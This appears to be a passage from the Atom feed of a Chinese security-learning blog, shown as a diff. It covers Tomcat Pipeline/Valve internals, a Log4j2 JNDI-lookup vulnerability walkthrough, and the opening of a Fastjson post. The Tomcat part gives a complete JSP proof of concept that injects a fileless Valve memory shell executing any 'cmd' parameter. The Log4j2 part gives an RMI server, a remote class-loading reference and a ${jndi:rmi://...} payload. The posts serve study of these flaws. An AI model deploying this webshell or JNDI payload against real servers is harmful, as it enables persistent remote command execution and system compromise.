+<p>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制</p>
+<figure data-type="image" tabindex="29"><img src="https://bloyet.github.io/post-images/1752213967112.png" alt="" loading="lazy"></figure>
+<p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个<strong>StandardPipeline</strong>实例。</p>
+<h3 id="管道机制流程分析">管道机制流程分析</h3>
+<p>Pipeline接口：</p>
+<p>我们可以看到它是继承了Contained</p>
+<pre><code class="language-java">public interface Pipeline extends Contained {
+ 
+    public Valve getBasic();
+ 
+    public void setBasic(Valve valve);
+ 
+    public void addValve(Valve valve);
+ 
+    public Valve[] getValves();
+ 
+    public void removeValve(Valve valve);
+ 
+    public void findNonAsyncValves(Set&lt;String&gt; result);
+}
+</code></pre>
+<p>Pipeline接口提供了各种各样对Value操作的接口，例如我们等会需要用的的addValue</p>
+<p>Value接口：</p>
+<pre><code class="language-java">public interface Valve {
+ 
+    public Valve getNext();
+ 
+    public void setNext(Valve valve);
+ 
+    public void backgroundProcess();
+ 
+    public void invoke(Request request, Response response)
+        throws IOException, ServletException;
+ 
+    public boolean isAsyncSupported();
+}
+</code></pre>
+<p>其中getNext()方法可以用来获取下一个Valve，这个调用模式跟Filter的调用模式很像</p>
+<figure data-type="image" tabindex="30"><img src="https://bloyet.github.io/post-images/1752213967129.jpeg" alt="" loading="lazy"></figure>
+<p>通过源码看一看，消息在容器之间是如何传递的</p>
+<p>消息传递到Connector被解析后，在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中：</p>
+<pre><code class="language-java">public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
+    Request request = (Request) req.getNote(ADAPTER_NOTES);
+    Response response = (Response) res.getNote(ADAPTER_NOTES);
+
+    if (request == null) {
+        // Create objects
+        request = connector.createRequest();
+        request.setCoyoteRequest(req);
+        response = connector.createResponse();
+        response.setCoyoteResponse(res);
+
+        // Link objects
+        request.setResponse(response);
+        response.setRequest(request);
+
+        // Set as notes
+        req.setNote(ADAPTER_NOTES, request);
+        res.setNote(ADAPTER_NOTES, response);
+
+        // Set query string encoding
+        req.getParameters().setQueryStringCharset(connector.getURICharset());
+    }
+        ...
+
+    try {
+        ...
+        connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);
+    }
+        ...
+}
+</code></pre>
+<p>主要的就是看这个<strong>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</strong></p>
+<p>我们这里最好是通过断点来看，看的更清楚</p>
+<figure data-type="image" tabindex="31"><img src="https://bloyet.github.io/post-images/1752213967145.png" alt="" loading="lazy"></figure>
+<p>connector.getService()： 获得StandardService<br>
+<img src="https://bloyet.github.io/post-images/1752213967159.png" alt="" loading="lazy"></p>
+<p>接着通过StandardService.getContainer().getPipeline()获取StandardPipeline对象</p>
+<figure data-type="image" tabindex="32"><img src="https://bloyet.github.io/post-images/1752213967175.png" alt="" loading="lazy"></figure>
+<p>connector.getService().getContainer().getPipeline().getFirst() 获取到Valve</p>
+<figure data-type="image" tabindex="33"><img src="https://bloyet.github.io/post-images/1752213967191.png" alt="" loading="lazy"></figure>
+<p>然后就是通过invoke方法 来执行不同的方法了</p>
+<h3 id="注入valve">注入Valve</h3>
+<p>我们可以看到是通过getFirst()来获取到不同的Valve 然后在执行对应的操作，那么我们就只需要获取到网页的context，然后把我们恶意的Value存放进去，就可以达到攻击目的了</p>
+<p>我们看看在哪里存放了Valve ，找到Pipeline</p>
+<figure data-type="image" tabindex="34"><img src="https://bloyet.github.io/post-images/1752213967239.png" alt="" loading="lazy"></figure>
+<p>pipeline是在它的父类中定义的</p>
+<figure data-type="image" tabindex="35"><img src="https://bloyet.github.io/post-images/1752213967207.png" alt="" loading="lazy"></figure>
+<p>接着看</p>
+<figure data-type="image" tabindex="36"><img src="https://bloyet.github.io/post-images/1752213967223.png" alt="" loading="lazy"></figure>
+<p>可以通过addValve方法添加Valve</p>
+<p>那么现在思路就明确了：</p>
+<ol>
+<li>获取<code>StandardContext</code>对象</li>
+<li>通过<code>StandardContext</code>对象获取<code>StandardPipeline</code></li>
+<li>编写恶意Valve</li>
+<li>通过<code>StandardPipeline.addValve()</code>动态添加Valve</li>
+</ol>
+<p>获取StandardPipeline对象</p>
+<pre><code class="language-java">&lt;%
+Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+reqF.setAccessible(true);
+Request req = (Request) reqF.get(request);
+StandardContext standardContext = (StandardContext) req.getContext();
+
+Pipeline pipeline = standardContext.getPipeline();
+%&gt;
+</code></pre>
+<p>编写恶意Valve</p>
+<p>继承父类，并且重写invoke方法</p>
+<pre><code class="language-java">&lt;%!
+class Shell_Valve extends ValveBase {
+
+@Override
+public void invoke(Request request, Response response) throws IOException, ServletException {
+    String cmd = request.getParameter(&quot;cmd&quot;);
+    if (cmd !=null){
+        try{
+            Runtime.getRuntime().exec(cmd);
+        }catch (IOException e){
+            e.printStackTrace();
+        }catch (NullPointerException n){
+            n.printStackTrace();
+        }
+    }
+}
+}
+%&gt;
+</code></pre>
+<p>动态添加Valve</p>
+<pre><code class="language-java">&lt;%
+Shell_Valve shell_valve = new Shell_Valve();
+pipeline.addValve(shell_valve);
+%&gt;
+</code></pre>
+<h3 id="poc-3">POC</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Pipeline&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+
+&lt;%
+Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+reqF.setAccessible(true);
+Request req = (Request) reqF.get(request);
+StandardContext standardContext = (StandardContext) req.getContext();
+
+Pipeline pipeline = standardContext.getPipeline();
+%&gt;
+
+&lt;%!
+class Shell_Valve extends ValveBase {
+
+    @Override
+    public void invoke(Request request, Response response) throws IOException, ServletException {
+        String cmd = request.getParameter(&quot;cmd&quot;);
+        if (cmd !=null){
+            try{
+                Runtime.getRuntime().exec(cmd);
+            }catch (IOException e){
+                e.printStackTrace();
+            }catch (NullPointerException n){
+                n.printStackTrace();
+            }
+        }
+    }
+}
+%&gt;
+
+&lt;%
+Shell_Valve shell_valve = new Shell_Valve();
+pipeline.addValve(shell_valve);
+%&gt;
+</code></pre>
+<p>访问jsp文件后 动态注入内存马 任意路径可以执行命令</p>
+<figure data-type="image" tabindex="37"><img src="https://bloyet.github.io/post-images/1752213967255.png" alt="" loading="lazy"></figure>
+<h1 id="总结">总结</h1>
+<p>其实Tomcat内存马学起来也不算太难，别给自己设置难度（这里是因为作者的开发功底不太好，很多基础的东西并没有去学过，所以一直在拖延吧，得好好反思），java的学习是需要沉下心来学习的 加油</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Log4j2反序列化]]></title>
+        <id>https://bloyet.github.io/post/log4j2-fan-xu-lie-hua/</id>
+        <link href="https://bloyet.github.io/post/log4j2-fan-xu-lie-hua/">
+        </link>
+        <updated>2025-06-11T02:36:45.000Z</updated>
+        <content type="html"><![CDATA[<p>学习log4j2反序列化之前呢，需要先来学习一下它是什么东西，怎么用</p>
+<h1 id="log4j2">Log4j2</h1>
+<p>log4j 和 log4j2 都是日志管理工具，相比于 log4j，log4j2 一步步变得越来越主流</p>
+<h2 id="环境配置">环境配置</h2>
+<p>依赖：</p>
+<pre><code class="language-java">&lt;dependency&gt;
+&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+&lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+&lt;version&gt;2.14.1&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+&lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+&lt;version&gt;2.14.1&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;junit&lt;/groupId&gt;
+&lt;artifactId&gt;junit&lt;/artifactId&gt;
+&lt;version&gt;4.12&lt;/version&gt;
+&lt;scope&gt;test&lt;/scope&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>我们这里用xlm来完成log4j的配置：</p>
+<p>通常分为两个部分：1.设置日志信息输出目的地 2.定义 logger，也就是定位我们需要打日志的包中</p>
+<p>把xml放在resources文件夹下，而且文件名必须是log4j2.xml（如果是用xml形式的话）</p>
+<pre><code class="language-java">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;Configuration status=&quot;TRACE&quot;&gt;
+
+&lt;!-- 配置日志信息输出目的地  Appenders--&gt;
+&lt;Appenders&gt;
+&lt;!-- 输出到控制台 --&gt;
+&lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;
+&lt;!--配置日志信息的格式 --&gt;
+&lt;PatternLayout
+pattern=&quot;%d{HH:mm:ss} [%t] %-5level %logger{36} - %msg%n&quot; /&gt;
+&quot;/&gt;
+&lt;/Console&gt;
+
+&lt;!-- 输出到文件，其中有一个append属性，默认为true，即不清空该文件原来的信息，采用添加的方式，若设为false，则会先清空原来的信息，再添加 --&gt;
+&lt;File name=&quot;MyFile&quot; fileName=&quot;./logs/info.log&quot; append=&quot;true&quot;&gt;
+&lt;PatternLayout&gt;
+&lt;!--配置日志信息的格式 --&gt;
+&lt;pattern&gt;%d{HH:mm:ss} [%t] %-5level %logger{36} - %msg%n&lt;/pattern&gt;
+            &lt;/PatternLayout&gt;
+            &lt;/File&gt;
+
+            &lt;/Appenders&gt;
+
+
+            &lt;!-- 定义logger,只有定义了logger并引入了appender,appender才会有效 --&gt;
+            &lt;Loggers&gt;
+            &lt;!-- 将业务dao接口所在的包填写进去,并用在控制台和文件中输出 --&gt; 记住你的文件是什么在xml就要对应
+            &lt;logger name=&quot;text&quot; level=&quot;TRACE&quot;
+            additivity=&quot;false&quot;&gt;
+            &lt;AppenderRef ref=&quot;Console&quot; /&gt;
+            &lt;AppenderRef ref=&quot;MyFile&quot; /&gt;
+            &lt;/logger&gt;
+
+            &lt;Root level=&quot;info&quot;&gt;
+            &lt;AppenderRef ref=&quot;Console&quot; /&gt;
+            &lt;AppenderRef ref=&quot;MyFile&quot; /&gt;
+            &lt;/Root&gt;
+            &lt;/Loggers&gt;
+            &lt;/Configuration&gt;
+</code></pre>
+<p>text类：</p>
+<pre><code class="language-java">package org.example;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class text {
+    public static void main(String[] args) {
+        Logger logger = LogManager.getLogger(text.class);
+        logger.trace(&quot;trace level&quot;);
+        logger.debug(&quot;debug level&quot;);
+        logger.info(&quot;info level&quot;);
+        logger.warn(&quot;warn level&quot;);
+        logger.error(&quot;error level&quot;);
+        logger.fatal(&quot;fatal level&quot;);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1749609817674.png" alt="" loading="lazy"></figure>
+<p>会发现自动生成了个logs文件夹，也是我们在xml文件中配置好的</p>
+<h1 id="log4j2-功能组件分析">log4j2 功能组件分析</h1>
+<h2 id="日志记录">日志记录</h2>
+<p>我们是使用**LogManager.getLogger()**方法来获取一个 logger 对象，然后通过调用 logger 对象的 debug/info/error/warn/fatal/trace/log 等方法记录日志等信息，随便打个断点就知道了，都会先使用org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled的若干重载方法</p>
+<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1749609817685.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1749609817696.png" alt="" loading="lazy"></figure>
+<p>根据当前配置文件中的配置信息中记录的日志等级，来判断是否需要输出 console 以及日志记录文件，log4j 中的日志记录等级默认如下： ALL &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF ，然后默认输出的是 WARN/ERROR/FATAL 等级的日志信息,当然我们也可以进行修改，在配置文件中去修改记录等级</p>
+<p>我们可以看到Logger本身就是一个接口，等看到下文，就知道只要调用了 info，error，warn 等方法都可以被作为漏洞的触发点。不同点是配置的输出等级不同</p>
+<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1749609817707.png" alt="" loading="lazy"></figure>
+<h2 id="消息格式化">消息格式化</h2>
+<p>log4j2 采用<strong>org.apache.logging.log4j.core.pattern.MessagePatternConverter</strong>来对日志信息进行处理</p>
+<p>大致看看这个目录结构：</p>
+<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1749609817718.png" alt="" loading="lazy"></figure>
+<p>先看看构造方法： 怎么进行初始化的</p>
+<p>会从 Properties 及 Options 中获取配置来判断是否需要提供 Lookups 功能</p>
+<pre><code class="language-java">private MessagePatternConverter(final Configuration config, final String[] options) {
+    super(&quot;Message&quot;, &quot;message&quot;);
+    this.formats = options;
+    this.config = config;
+    final int noLookupsIdx = loadNoLookups(options);
+    // 从系统配置（Properties）和 options 共同判断是否禁用 lookup
+    this.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= 0;
+    // 加载文本渲染器（根据是否禁用 lookup 决定传什么参数）
+    this.textRenderer = loadMessageRenderer(noLookupsIdx &gt;= 0 ? ArrayUtils.remove(options, noLookupsIdx) : options);
+}
+</code></pre>
+<p>并且其中<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</code>的获取是通过工具类的 <code>getBooleanProperty</code>方法来获取的</p>
+<pre><code class="language-java">public static final boolean FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(
+    &quot;log4j2.formatMsgNoLookups&quot;, false);
+</code></pre>
+<p>getBooleanProperty：</p>
+<pre><code class="language-java">public boolean getBooleanProperty(final String name, final boolean defaultValue) {
+    String prop = this.getStringProperty(name);
+    return prop == null ? defaultValue : &quot;true&quot;.equalsIgnoreCase(prop);
+}
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1749609817731.png" alt="" loading="lazy"></figure>
+<p>在getBooleanProperty默认会传进来一个false，然后进行一个三目运算，就把defaultValue，也就是false</p>
+<p>在来看看noLookupsIdx的值：</p>
+<p>在默认情况下，options是个空数组，运算出来为-1</p>
+<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1749609817742.png" alt="" loading="lazy"></figure>
+<p>结合这两个，就可以看到：</p>
+<pre><code class="language-java">//默认情况下，noLookups是false，也就是不禁用Lookup的
+this.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= 0;
+</code></pre>
+<p>然后就继续执行loadMessageRenderer方法，根据是否禁用 lookup 决定传什么参数，所以传的是options的值：</p>
+<p>options只是空字符串数组，并不等于null，方法通过 options 中的字符配置来获取相应的模板渲染器</p>
+<pre><code class="language-java">private TextRenderer loadMessageRenderer(final String[] options) {
+    if (options != null) {
+        for (final String option : options) {
+            switch (option.toUpperCase(Locale.ROOT)) {
+                case &quot;ANSI&quot;:
+                    if (Loader.isJansiAvailable()) {
+                        return new JAnsiTextRenderer(options, JAnsiTextRenderer.DefaultMessageStyleMap);
+                    }
+                    StatusLogger.getLogger()
+                    .warn(&quot;You requested ANSI message rendering but JANSI is not on the classpath.&quot;);
+                    return null;
+                case &quot;HTML&quot;:
+                    return new HtmlTextRenderer(options);
+            }
+        }
+    }
+    return null;
+}
+</code></pre>
+<p>看到format方法，也是在<strong>MessagePatternConverter</strong>这个类中</p>
+<p>第一段 if 判断的内容是先从 event 中获取到 message，然后判断 message 的类型是否为 StringBuilderFormattable，之后就是渲染的具体内容<br>
+第二段 if 判断的内容是重点，在一个正常请求的情况下：config 获取不为空，并且 noLookups 默认为 false 的情况下，标志着我们可以通过 lookups 功能来进行<strong>字符串解析</strong><br>
+然后这里的解析功能的重点是在 <code>config.getStrSubstitutor().replace(event, value)</code>中</p>
+<pre><code class="language-java">public void format(final LogEvent event, final StringBuilder toAppendTo) {
+    final Message msg = event.getMessage();
+    if (msg instanceof StringBuilderFormattable) {
+
+        final boolean doRender = textRenderer != null;
+        final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo;
+
+        final int offset = workingBuilder.length();
+        if (msg instanceof MultiFormatStringBuilderFormattable) {
+            ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);
+        } else {
+            ((StringBuilderFormattable) msg).formatTo(workingBuilder);
+        }
+
+        // TODO can we optimize this?
+        if (config != null &amp;&amp; !noLookups) {
+            for (int i = offset; i &lt; workingBuilder.length() - 1; i++) {
+                if (workingBuilder.charAt(i) == '$' &amp;&amp; workingBuilder.charAt(i + 1) == '{') {
+                    final String value = workingBuilder.substring(offset, workingBuilder.length());
+                    workingBuilder.setLength(offset);
+                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));
+                }
+            }
+        }
+        if (doRender) {
+            textRenderer.render(workingBuilder, toAppendTo);
+        }
+        return;
+    }
+    if (msg != null) {
+        String result;
+        if (msg instanceof MultiformatMessage) {
+            result = ((MultiformatMessage) msg).getFormattedMessage(formats);
+        } else {
+            result = msg.getFormattedMessage();
+        }
+        if (result != null) {
+            toAppendTo.append(config != null &amp;&amp; result.contains(&quot;${&quot;)
+                              ? config.getStrSubstitutor().replace(event, result) : result);
+        } else {
+            toAppendTo.append(&quot;null&quot;);
+        }
+    }
+}
+</code></pre>
+<h2 id="字符处理">字符处理</h2>
+<p>处理字符串的关键类是StrSubstitutor</p>
+<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1749609817753.png" alt="" loading="lazy"></figure>
+<p>先看下这个类定义的常量：</p>
+<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1749609817763.png" alt="" loading="lazy"></figure>
+<pre><code>DEFAULT_ESCAPE` 是 `$`，`DEFAULT_PREFIX` 前缀是 `${`，`DEFAULT_SUFFIX` 后缀是 `}`，`DEFAULT_VALUE_DELIMITER_STRING` 赋值分隔符是 `:-`，`ESCAPE_DELIMITER_STRING` 是 `:\-
+</code></pre>
+<p>substitute是StrSubstitutor 中的关键方法，也是lookup中的关键点，用来递归处理字符串</p>
+<p>方法比较多，我们就看关键步骤，知道怎么对字符串进行处理的就行：<br>
+方法的开头先把各个前后缀以及内容的匹配器加载上</p>
+<p><img src="https://bloyet.github.io/post-images/1749612710807.png" alt="" loading="lazy"><br>
+然后通过 while 循环来找前缀，这里找的前缀是最开始的前缀</p>
+<p><img src="https://bloyet.github.io/post-images/1749612812025.png" alt="" loading="lazy"><br>
+找完前缀再找后缀，不过在找后缀的 while 循环中，又判断了是否替换变量中的值，如果替换，则再匹配一次前缀，如果找到了前缀，则 continue 跳出循环，再走一次找后缀的逻辑，比如说这个<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;}&#039;, got &#039;EOF&#039; at end of input: {'>{</span>{}}这种情况<br>
+<img src="https://bloyet.github.io/post-images/1749612812036.png" alt="" loading="lazy"><br>
+后续的逻辑中，主要是针对<code>DEFAULT_VALUE_DELIMITER_STRING</code>以及<code>ESCAPE_DELIMITER_STRING</code>进行，通过多个 if/else 来匹配<code>:-</code>和<code>:\-</code></p>
+<p><img src="https://bloyet.github.io/post-images/1749612812046.png" alt="" loading="lazy"><br>
+这里就不一一分析代码了，这里其实就是对两个标识符的功能的描述：</p>
+<ul>
+<li><code>:- </code>是一个赋值关键字，如果程序处理到 <code>${aaaa:-bbbb}</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li>
+<li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key a 中包含<code>:</code>，则需要使用转义来配合处理，例如 <code>${aaa:\\-bbb:-ccc}</code>，代表 key 是<code>aaa:bbb</code>，value 是 <code>ccc</code></li>
+</ul>
+<p>在没有匹配到变量赋值或者匹配结束后，将会调用<code>resolveVariable</code>方法：</p>
+<p>他会先获得一个VariableResolver类，实际上它是个代理类，调用这个代理类的lookup方法，我们现在在来深入研究这个代理类</p>
+<pre><code class="language-java">protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
+                                 final int startPos, final int endPos) {
+    final StrLookup resolver = getVariableResolver();
+    if (resolver == null) {
+        return null;
+    }
+    return resolver.lookup(event, variableName);
+}
+</code></pre>
+<h2 id="代理类分析">代理类分析</h2>
+<p>Log4j2 使用 <code>org.apache.logging.log4j.core.lookup.Interpolator</code> 类来代理所有的 <code>StrLookup</code> 实现类。也就是说在实际使用 Lookup 功能时，由 Interpolator 这个类来处理和分发</p>
+<p>先看一眼目录结构</p>
+<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1749609817773.png" alt="" loading="lazy"></figure>
+<p>先看一下构造方法：</p>
+<p>这个类在初始化时创建了一个 <code>strLookupMap</code> ，将一些 lookup 功能关键字和处理类进行了映射，存放在这个 Map 中</p>
+<p>在 2.14.0 版本中，默认是加入 log4j、sys、env、main、marker、java、lower、upper、<strong>jndi</strong>、jvmrunargs、spring、kubernetes、docker、web、date、ctx，由于部分功能的支持并不在 core 包中，所以如果加载不到对应的处理类，则会添加警告信息并跳过。而这些不同 Lookup 功能的支持，是随着版本更新的，例如在较低版本中，不存在 upper、lower 这两种功能，因此在使用时要注意环境。</p>
+<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1749609817784.png" alt="" loading="lazy"></figure>
+<p>我们直接去看lookup方法：</p>
+<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1749609817795.png" alt="" loading="lazy"></figure>
+<p>它通过<code>:</code>作为表示符，用来分隔 Lookup 关键字和参数，从 strLookup 中根据分割出来的关键字匹配到相应的处理类，并调用其 Lookup 方法</p>
+<p>漏洞触发点：jndi:      因为在这里它是有着对应的处理类的，并且这个处理类可以进行利用</p>
+<p><code>jndi:</code>关键字对应的处理类是<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>，我们跟进查看具体它的 lookup 方法是如何被调用的</p>
+<pre><code class="language-java">public String lookup(final LogEvent event, String var) {
+    if (var == null) {
+        return null;
+    }
+
+    final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
+    if (prefixPos &gt;= 0) {
+        final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);
+        final String name = var.substring(prefixPos + 1);
+        final StrLookup lookup = strLookupMap.get(prefix);
+        if (lookup instanceof ConfigurationAware) {
+            ((ConfigurationAware) lookup).setConfiguration(configuration);
+        }
+        String value = null;
+        if (lookup != null) {
+            value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);
+        }
+
+        if (value != null) {
+            return value;
+        }
+        var = var.substring(prefixPos + 1);
+    }
+    if (defaultLookup != null) {
+        return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var);
+    }
+    return null;
+}
+</code></pre>
+<p>看具体的处理类：JndiLookup#lookup</p>
+<pre><code class="language-java">public String lookup(final LogEvent event, final String key) {
+    if (key == null) {
+        return null;
+    }
+    final String jndiName = convertJndiName(key);
+    try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
+        return Objects.toString(jndiManager.lookup(jndiName), null);
+    } catch (final NamingException e) {
+        LOGGER.warn(LOOKUP, &quot;Error looking up JNDI resource [{}].&quot;, jndiName, e);
+        return null;
+    }
+}
+</code></pre>
+<p>JndiManager 的 lookup</p>
+<pre><code class="language-java">public &lt;T&gt; T lookup(final String name) throws NamingException {
+    return (T) this.context.lookup(name);
+}
+</code></pre>
+<p>看下这个context是不是满足JNDI的context ，context是什么</p>
+<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1749609817805.png" alt="" loading="lazy"></figure>
+<p>在构造方法中进行了赋值，看看哪里调用了构造方法（唯一）：</p>
+<pre><code class="language-java">private static class JndiManagerFactory implements ManagerFactory&lt;JndiManager, Properties&gt; {
+
+    @Override
+    public JndiManager createManager(final String name, final Properties data) {
+        try {
+            return new JndiManager(name, new InitialContext(data));
+        } catch (final NamingException e) {
+            LOGGER.error(&quot;Error creating JNDI InitialContext.&quot;, e);
+            return null;
+        }
+    }
+}
+</code></pre>
+<p>从正面看：</p>
+<p>final JndiManager jndiManager = JndiManager.getDefaultManager()  -&gt;getManager -&gt;manager = factory.createManager(name, data); 然后就是上面这段实例化了</p>
+<p>所以这个上下文就是InitialContext了，那么调用的就是InitialContext 的 lookup ，之后就是熟悉的 JNDI 注入的原始的流程了</p>
+<h1 id="漏洞复现">漏洞复现</h1>
+<p>启个python服务 里面是我们的恶意工厂类字节码：</p>
+<p>python -m http.server 8000</p>
+<p>启个rmi服务器：</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+public class JNDI_server {
+    public static void main(String[] args) throws Exception {
+        LocateRegistry.createRegistry(1099);
+        Reference reference=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://127.0.0.1:8000/&quot;);
+        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
+        Naming.bind(&quot;rmi://127.0.0.1:1099/Bloyet&quot;,referenceWrapper);
+    }
+}
+</code></pre>
+<p>POC:</p>
+<pre><code class="language-java">package org.example;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class log4j2POC {
+    public static void main(String[] args) {
+        Logger logger = LogManager.getLogger(log4j2POC.class);
+
+        String poc = &quot;${jndi:rmi://127.0.0.1:1099/Bloyet}&quot;;
+
+        logger.info(&quot;EXP {} EXP&quot;,poc);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1749609817816.png" alt="" loading="lazy"></figure>
+<p>在来跟着看一遍流程，其实一开始已经走过一遍了，这一遍理解起来会简单很多。因为这个是会设计日志操作，跟我们漏洞无关的我们就不跟了。</p>
+<p>我们知道漏洞点是字符串处理阶段，我们直接来看最关键的类和方法就行了</p>
+<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1749609817827.png" alt="" loading="lazy"></figure>
+<p>走到代理类：</p>
+<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1749609817837.png" alt="" loading="lazy"></figure>
+<p>调用代理类的lookup方法：</p>
+<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1749609817848.png" alt="" loading="lazy"></figure>
+<p>发现确实是Interpolator真正处理lookup方法的类</p>
+<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1749609817859.png" alt="" loading="lazy"></figure>
+<p>走到处理jndi功能点的类：JndiManager</p>
+<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1749609817869.png" alt="" loading="lazy"></figure>
+<p>步入getDefaultManager方法</p>
+<p>在这里进行实例化，并且初始化context上下文</p>
+<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1749609817880.png" alt="" loading="lazy"></figure>
+<p>继续</p>
+<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1749609817890.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1749609817901.png" alt="" loading="lazy"></figure>
+<p>实例化一个新的JndiManager 并且实例化一个上下文</p>
+<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1749609817911.png" alt="" loading="lazy"></figure>
+<p>一路跟进到最终的lookup方法，到这 就可以看到 游戏结束！</p>
+<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1749609817921.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Fastjson反序列化]]></title>
+        <id>https://bloyet.github.io/post/fastjson/</id>
+        <link href="https://bloyet.github.io/post/fastjson/">
+        </link>
+        <updated>2025-06-09T17:59:34.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="fastjson介绍">Fastjson介绍</h1>
+<p>fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。<br>
+由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁，用户量十分庞大，这也就导致了这样的组件一旦爆出漏洞，危害也将会是巨大的，因此，fastjson 从第一次报告安全漏洞至今，进行了若干次的安全更新，也与安全研究人员进行了来来回回多次的安全补丁-绕过的流程。</p>
+<h1 id="fastjson基础学习">Fastjson基础学习</h1>
+<p>fastjson主要通过将一个json格式的文件转为一个java的对象，或者将一个java对象转为一个json格式的对象，但是这里的转化是需要满足一定条件，不是所有的对象都可以直接转为json格式，其中转化的过程就是通过序列化和反序列化，当然这个就与原生的jdk版本没有太多关联，这个属于插件存在的漏洞</p>
